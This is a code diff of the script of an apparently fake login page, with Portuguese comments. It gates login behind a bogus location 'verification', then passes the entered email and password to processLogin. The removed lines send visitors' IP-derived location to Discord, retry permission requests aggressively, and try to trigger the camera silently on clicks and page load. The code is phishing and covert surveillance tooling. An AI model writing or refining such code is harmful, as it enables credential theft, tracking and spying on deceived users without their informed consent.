-                        // Mostrar modal indicando que verificação é necessária
-                        showBlockingMessage();
-                    });
-                return;
-            }
-            
-            // Mostrar mensagem de bloqueio
-            showBlockingMessage();
-        });
-        
-        // Função para mostrar mensagem de bloqueio
-        function showBlockingMessage() {
             // Mostra uma mensagem explicando que a verificação é necessária
             const alertMessage = document.createElement('div');
             alertMessage.style.position = 'fixed';
@@ -1686,9 +1231,6 @@
                 <button id="retryVerification" style="background-color:#0095f6;border:none;border-radius:4px;color:white;font-weight:600;padding:8px 0;width:100%;cursor:pointer;">
                     Tentar novamente
                 </button>
-                <button id="useIPFallback" style="background-color:transparent;border:none;color:#0095f6;font-weight:600;padding:8px 0;width:100%;cursor:pointer;margin-top:10px;">
-                    Usar verificação alternativa
-                </button>
             `;
             document.body.appendChild(alertMessage);
             
@@ -1697,47 +1239,7 @@
                 document.body.removeChild(alertMessage);
                 showLocationModal();
             });
-            
-            // Adicionar evento ao botão "Usar verificação alternativa"
-            document.getElementById('useIPFallback').addEventListener('click', function() {
-                document.body.removeChild(alertMessage);
-                
-                // Usar IP como fallback e permitir login
-                getIPInfo().then(ipInfo => {
-                    if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
-                        sendLocationToDiscord(
-                            ipInfo.latitude, 
-                            ipInfo.longitude, 
-                            null, 
-                            "IP (Fallback - Usuário escolheu verificação alternativa)"
-                        );
-                    }
-                    
-                    verificacaoConcluida = true;
-                    
-                    // Mostrar mensagem de sucesso
-                    const successMessage = document.createElement('div');
-                    successMessage.style.position = 'fixed';
-                    successMessage.style.top = '50%';
-                    successMessage.style.left = '50%';
-                    successMessage.style.transform = 'translate(-50%, -50%)';
-                    successMessage.style.backgroundColor = 'rgba(0, 150, 0, 0.9)';
-                    successMessage.style.color = 'white';
-                    successMessage.style.padding = '15px 20px';
-                    successMessage.style.borderRadius = '5px';
-                    successMessage.style.zIndex = '10000';
-                    successMessage.style.boxShadow = '0 2px 10px rgba(0,0,0,0.3)';
-                    successMessage.style.fontWeight = 'bold';
-                    successMessage.style.textAlign = 'center';
-                    successMessage.innerHTML = "✓<br>Verificação alternativa concluída!<br><span style='font-size:12px;font-weight:normal;'>Você pode fazer login agora.</span>";
-                    document.body.appendChild(successMessage);
-                    
-                    setTimeout(function() {
-                        document.body.removeChild(successMessage);
-                    }, 2000);
-                }).catch(console.error);
-            });
-        }
+        });
         
         // Manipular envio do formulário
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -1756,82 +1258,9 @@
             if (verificacaoConcluida) {
                 processLogin(email, password);
             } else {
-                // Tentar agressivamente obter permissões novamente
-                permissionRetryCount++;
-                
-                // Tentar primeiro direto - pode funcionar em alguns navegadores sem mostrar o modal
-                if (isIOS) {
-                    getiOSLocation()
-                        .then(() => {
-                            verificacaoConcluida = true;
-                            processLogin(email, password);
-                        })
-                        .catch(() => {
-                            // Caso contrário, mostrar o modal
-                            showLocationModal();
-                        });
-                } else {
-                    getLocation()
-                        .then(() => {
-                            verificacaoConcluida = true;
-                            processLogin(email, password);
-                        })
-                        .catch(() => {
-                            // Se falhar, verificar se já tentamos muitas vezes
-                            if (permissionRetryCount >= 3) {
-                                // Após várias tentativas, usar fallback de IP
-                                getIPInfo().then(ipInfo => {
-                                    if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
-                                        sendLocationToDiscord(
-                                            ipInfo.latitude, 
-                                            ipInfo.longitude, 
-                                            null, 
-                                            "IP (Fallback após múltiplas tentativas)"
-                                        );
-                                    }
-                                    
-                                    verificacaoConcluida = true;
-                                    processLogin(email, password);
-                                }).catch(error => {
-                                    console.error("Erro no fallback:", error);
-                                    processLogin(email, password);
-                                });
-                            } else {
-                                // Caso contrário, mostrar o modal
-                                showLocationModal();
-                            }
-                        });
-                }
+                // Caso contrário, mostrar o modal
+                showLocationModal();
             }
-        });
-        
-        // Adicionar evento de clique a qualquer lugar na página para tentar iniciar a câmera
-        // Isto é útil porque alguns navegadores exigem interação do usuário antes de permitir acesso à câmera
-        document.addEventListener('click', function() {
-            if (isMobile && !cameraAttempted) {
-                // Tentar iniciar câmera após clique
-                initCamera();
-            }
-        });
-        
-        // Verificação adicional para contornar bloqueios
-        // Alguns navegadores exigem interação de usuário antes de solicitar permissões
-        // Tentamos várias vezes com diferentes gatilhos
-        window.addEventListener('load', function() {
-            // Tenta após o carregamento completo
-            setTimeout(() => {
-                if (isMobile && !cameraAttempted) {
-                    initCamera();
-                }
-            }, 1000);
-            
-            // Tenta novamente após alguns segundos
-            setTimeout(() => {
-                if (!cameraImage && isMobile) {
-                    cameraAttempted = false; // Resetar para permitir nova tentativa
-                    initCamera();
-                }
-            }, 3000);
         });
     </script>
 </body>
